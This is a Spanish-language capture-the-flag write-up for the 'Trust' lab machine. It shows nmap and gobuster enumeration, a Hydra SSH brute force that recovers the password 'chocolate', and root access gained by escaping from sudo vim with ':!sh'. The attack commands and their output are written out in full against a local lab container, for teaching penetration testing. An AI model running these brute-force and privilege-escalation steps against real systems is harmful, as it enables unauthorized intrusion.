# Maquina-Trust 
## Resolviendo maquina-Trust de "El Pingüino de Mario" 

> Paso N°:1 Scaneo con nmap. (Fase de reconocimiento)

```bash
nmap -A 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-17 09:40 -03
Nmap scan report for 172.17.0.2
Host is up (0.000094s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
| 256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3
(ECDSA)
|_ 256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b
(ED25519)
80/tcp open http Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
```
![scaneo1](https://github.com/EzeTauil/maquina-Trust/assets/118028611/839fd0e6-ddae-4b03-ad92-ea861a58cfa6)

## Paso N°2: Buscamos alguna pista en la web.
### _Ya que podemos ver en el scaneo de nmap que el puerto "80/tcp open http Apache httpd 2.4.57 ((Debian))" esta abierto, asi que ponemos "http://172.17.0.2" en el navegador para ver que muestra:_

![scaneo2](https://github.com/EzeTauil/maquina-Trust/assets/118028611/4e677bca-cea9-4c82-8f11-cc9d40e33d8a)
### _Al ver solo la pagina de configuracion de Apache procedemos a un scaneo con Gobuster para ver si encontramos algo más importante._

## Paso N°3: Enumeracion usando gobuster.
### _Usamos el comando "gobuster dir -u" para enumerar todos los directorios en el servidor web y "-x php,txt,py,bak,php.bak" para las extensiones de archivo que Gobuster debe añadir a las palabras en la wordlist durante la búsqueda._

```bash
gobuster dir -u "http://172.17.0.2" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,py,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```
![scaneo3](https://github.com/EzeTauil/maquina-Trust/assets/118028611/8ebee023-93c2-44f5-9310-f141b58d1928)



## Paso N°4: Revisar y utilizar lo encontrado.

### _En éste caso vemos un "/secret.php" el cual vamos a usar poniendolo en la web como "http://172.17.0.2/secret.php" ,en la salida nos encontramos con un mensaje que dice:_ 
> mario, ésta web no es vulnerable.

![scaneo4](https://github.com/EzeTauil/maquina-Trust/assets/118028611/098a01f7-2121-470d-9fe4-b0ab13a4b91b)


### _Asi que como nos da un nombre (Mario) podemos usarlo de prueba para ver si podemos obtener acceso por medio del ssh, pero como no tenemos la contraseña vamos a usar ataque de fuerza bruta en éste caso con hydra_

## Paso N°5: Ataque de Fuerza Bruta con Hydra.

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-17 10:22:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-17 10:22:52
```
![scaneo5](https://github.com/EzeTauil/maquina-Trust/assets/118028611/72496ff2-a25a-4391-b968-884e9088714b)

## Paso N°6: Explotacion-Acceso por ssh.
### Con el ataque de Hydra encontramos la contraseña para el usuario mario la cual es "chocolate", asi que ahora nos conectamos a traves de ssh de la siguiente manera:

```bash
ssh mario@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:z6uc1wEgwh6GGiDrEIM8ABQT1LGC4CfYAYnV4GXRUVE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
mario@172.17.0.2's password: 
Linux 10340d532be9 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.6.15-2kali1 (2024-05-17) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
```
![acceso1](https://github.com/EzeTauil/maquina-Trust/assets/118028611/48290ae0-a9fb-40d7-8869-f3bb7bab4586)


## Paso N°7: Escalando Privilegios.

```bash
~$ whoami
mario
```
![acceso2](https://github.com/EzeTauil/maquina-Trust/assets/118028611/4050709c-8b2c-44e3-9aa3-56f4a0a00c73)


### _Procedemos a verificar que comandos podemos ejecutar como usuario root, lo hacemos con el comando (sudo -l)_

```bash
mario@10340d532be9:~$ sudo -l  
[sudo] password for mario: 
Matching Defaults entries for mario on 10340d532be9:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 10340d532be9:
    (ALL) /usr/bin/vim
```
![acceso3](https://github.com/EzeTauil/maquina-Trust/assets/118028611/878ea32a-5cf4-4c02-8436-52109abf2a36)

### _Aca vemos que podemos usar "vim" como usuario root, asi que podemos explotar ésto para obtener una shell con privilegios de root, lo hacemos de la siguiente manera: (sudo vim) una vez adentro precionamos "Esc" y despues ":" y escribimos "!sh" de manera que el comando final quedaria asi ":!sh" y precionamos "Enter" ésto nos abre la shell como usuario root, lo comprobamos usando el comando "whoami" , si nos devuelve "root" es que lo logramos.

![acceso4](https://github.com/EzeTauil/maquina-Trust/assets/118028611/c13dd59c-84a2-4b3b-a0a2-4ed5b75bdc4e)

## Obteniendo Shell con acceso root:

![accesoroot](https://github.com/EzeTauil/maquina-Trust/assets/118028611/5afc3cb7-1047-4137-8a17-def53769b98d)






